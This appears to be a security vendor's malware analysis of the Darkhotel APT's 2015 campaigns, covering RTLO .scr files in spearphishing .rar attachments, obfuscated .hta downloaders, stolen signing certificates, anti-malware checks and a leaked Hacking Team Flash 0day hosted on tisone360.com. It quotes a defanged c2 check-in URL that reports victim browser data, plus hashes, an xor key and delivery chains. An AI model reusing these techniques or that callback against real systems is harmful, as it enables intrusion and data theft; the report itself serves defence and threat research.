Darkhotel APT attacks dated 2014 and earlier are characterized by the misuse of stolen
certificates, the deployment of .hta files with multiple techniques, and the use of unusual
methods like the infiltration of hotel Wi-Fi to place backdoors in targets’ systems. In 2015,
many of these techniques and activities remain in use. However, in addition to new variants
of malicious .hta, we find new victims, .rar attachments with RTLO spearphishing, and the
deployment of a 0day from Hacking Team.
The Darkhotel APT continues to spearphish targets around the world, with a wider
geographic reach than its previous botnet buildout and hotel Wi-Fi attacks. Some of the
targets are diplomatic or have strategic commercial interests.

2015 spearphishing incident attachment name subset:
schedule(6.1~6).rar -> schedule(6.1~6)_?gpj.scr
schedule(2.11~16).rar -> schedule(2.11~16)_?gpj.scr
congratulation.rar -> congratulation_?gpj.scr
letter.rar -> letter_?gpj.scr

Consistent use of obfuscated .hta downloaders
Whether the infection is achieved through spearphishing, physical access to a system or the
Hacking Team Flash 0day, there frequently seems to be a common method for a newlyinfected system to communicate with Darkhotel’s c2:
A lightly obfuscated (double escaped set of javascript variable values) script maintained
within an .hta file writes an executable to disk and executes it.
It is interesting that this particular group has for years now deployed backdoor and
downloader code in the form of .hta files. In 2010, we observed it re-purposing articles on
North Korea by the US think-tank, Brookings Institute, in order to attack North Korean-related
targets with malicious code buried in .hta files. It also emailed links to its malicious .hta files

2/17

to North Korean tourist groups, economists with an interest in North Korea, and more. It’s
somewhat strange to see such heavy reliance on older Windows-specific technology like
HTML applications, introduced by Microsoft in 1999.
From the recent sendspace[.]servermsys[.]com/downloader.hta:

After execution and escaping a couple of variables, the .hta uses ancient Adodb.stream
components in order to write out a string xor’d with 0x3d as an executable file and runs it.

This code results in the execution of “internet_explorer_Smart_recovery.exe”
054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2.
In this case, it seems that Darkhotel operators are checking as to whether or not the victim’s
3/17

default browser is Internet Explorer, as all versions of IE return the value “0” and other
browsers leave “appMinorVersion” undefined. This data collection seems somewhat odd,
because .hta files are supported and run by mshta.exe on Windows systems only, still
delivered with Windows 8. Perhaps it is an artefact from early development of the code. Here
is a recent version:
“hxxp://sendspace[.]servermsys[.]com/readme.php?
type=execution&result=created_and_executed&info=” + navigator.appMinorVersion + “

The “internet_explorer_Smart_recovery.exe” file is a simple obfuscated downloader. A series
of xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to
disk and executed. Later in the execution, a more complex rc4 loop decrypts the download
url and other strings and imports.

When finished, this url string decryption and connectback looks like
http://sendspace[.]servermsys[.]com/wnctprx. The file is downloaded
(b1f56a54309147b07dda54623fecbb89) to “.tmp” file in %temp%, executed, and the
downloader exits. This larger file is a backdoor/downloader that includes ssh functionality,
and drops its keys to disk for ssh interaction. We find older Darkhotel information stealers
dropped and run on the system by these downloaders.

Spearphishing and .rar Attachments with RTLO
The Darkhotel APT will relentlessly spearphish specific targets in order to successfully
compromise systems. Some targets are spearphished repeatedly with much the same
social-engineering schemes. For example, the attachment “schedule(2.11~16).rar” could be
sent on February 10th, with Darkhotel returning to the same targets in late May for a second
attempt with attachment “schedule(6.1~6).rar”.

It consistently archives RTLO .scr executable files with in .rar archives, in order to appear to
the target as innocuous .jpg files. These executable files are lite droppers, maintaining these
decoy jpeg files, and code to create an lnk downloader.

5/17

When the target attempts to open what they think is a jpg image file, the executable code
runs and drops a jpg image to disk, then opens it with mspaint.exe in the background. This
“congratulations” document is in Korean, revealing a likely characteristic of the intended
target.

6/17

While the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and
launches it. The shortcut maintains a multiline target shell script. This technique is also used
by other APTs as persistence mechanisms, as documented by our colleagues. The 64kb lnk
file is downloader code:

7/17

When this lnk file is executed, it begins an AJAX-based download process for the “unzip.js”
file (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file
implementing AJAX to download and execute a relatively large compiled executable:

8/17

This executable code is saved to %temp%\csrtsrm.exe and executed there. It is a relatively
large executable (~1.2 mb) that injects malicious code and spawns remote threads into
legitimate processes.

Stolen certificates and evasion
The group appears to maintain a stockpile of stolen certificates and deploys their
downloaders and the backdoors signed with them. Some of the more recent revoked
certificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.
Darkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly
adapted to attacking better-defended environments and prefers not to burn these stolen
digital certificates. In previous attacks it would simply have taken advantage of a long list of
weakly implemented, broken certificates.
Not only are its obfuscation techniques becoming stronger, but its anti-detection technology
list is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec)
decrypts a set of anti-malware strings in stages to identify defensive technologies on a
newly-infected system, and then opens each process, looking for a matching image name:

Even the identifying information that the backdoor seeks from a system is not decrypted until
runtime. Like the “information-stealer” component documented in our previous Darkhotel
technical report, this component seeks to steal a set of data with which to identify the
infected system. Much of the information is collected with the same set of calls, i.e.
kernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:
Default system codepage
Network adapter information
Processor architecture
Hostname and IP address
Windows OS and Service Pack versions
Essentially, much of this information-stealer code is the same as that observed in previous
attacks.

Tisone360.com, Visits, and Hacking Team Flash 0day
The tisone360.com site was especially interesting to us. In April 2015, Darkhotel was emailphishing with links to earlier (cve-2014) Flash exploits, and then, at the beginning of July, it
began to distribute what is reported to be a leaked Hacking Team Flash 0day.
It looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to
target specific systems. We can pivot from “tisone360.com” to identify some of this activity.
The site was up and active as late as 22 July, 2015. However, this looks to be a small part of
its activity. In addition to the icon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it
looks as though the “tisone360.com” site was delivering a Flash CVE-2014-0497 exploit in
April. We reported the related vulnerability to Adobe in January 2014, when it was being
used by the Darkhotel APT.
Recently, the Darkhotel APT has maintained multiple working directories on this site.

It is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The
most interesting of these is the reported Hacking Team Flash 0day, icon.swf. In the days
following the public mention of this server, the crew slowly tightened down open access to
/ims2/. Either way, the contents continued to be actively used.
icon.swf (214709aa7c5e4e8b60759a175737bb2b) -> icon.jpg
(42a837c4433ae6bd7490baec8aeb5091)
-> %temp%\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)
After icon.jpg is downloaded by the flash exploit, it is decoded with a multi-byte xor key
0xb369195a02. It then downloads further components.
It’s interesting to note that the group appears to be altering the compilation and linker
timestamps of its executable code to dates in 2013. We see this across multiple samples
deployed and observed for the first time in mid-2015, including the icon.jpg downloader.

11/17

A log of visits to the site directory records that the directory was set up on July 8th. A handful
of visits to a specific url on the server from five systems based in the following locations were
recorded on the 8th and 9th. Several of these are likely to be Darkhotel APT targets:
Germany
South Korea
China (likely to be research)
US
Japan
However, one of those systems hammered the site on the 9th, visiting almost 12,000 times in
30 minutes. This volume of traffic is likely to represent a noisy scanning research attempt
and not someone DoS’ing the site:

Recorded site visits following the 9th are likely to be unreliable and may be more
researchers, responding to the growing notoriety of the site following the public reports on
the 9th. Many of these approximately 50 visits come from a subset of the above systems and
are repeated multiple times. Visits from the following locations occurred on or after the 10th:
Germany (likely to be research)
Ukraine (likely to be research)
Amazon Web Services, multiple locations (likely to be research)
Googlebot, multiple locations
US
Ireland (likely to be research)
Russia
Brazil
China
Finland
Canada
Taiwan
France (likely to be research)

A consistent attack flow
The Darkhotel group tends to stick with what works. For example, for years we saw repeated
use of spearphishing targets directly with .hta files. Now, as with the tisone360.com site
above, we have seen repeated use in 2015 of a creative chain of delivery sets.
downloader -> hta checkin -> info stealer -> more compiled components.
dropper -> wsh script -> wsh script -> info stealer -> more compiled components
spearphish -> dropper -> hta checkin -> downloader -> info stealer
While a chain of delivery that includes obfuscated scripts within .hta files occurred as far
back as 2011, the volume appears to have picked up in 2014 and now 2015.

Hiding infrastructure in plain sight
The group is now more vigilant in maintaining its sites, tightening up configuration and
response content. Right now, its c2 responds with anti-hero images of “Drinky Crow” from the
alt Maakies cartoon:

Other Darkhotel c2s tend to blend in with random sites on the web when incorrect or missing
pages are visited. They are ripping images either from FOTOLIA or articles on artisanal ice
cream makers here:
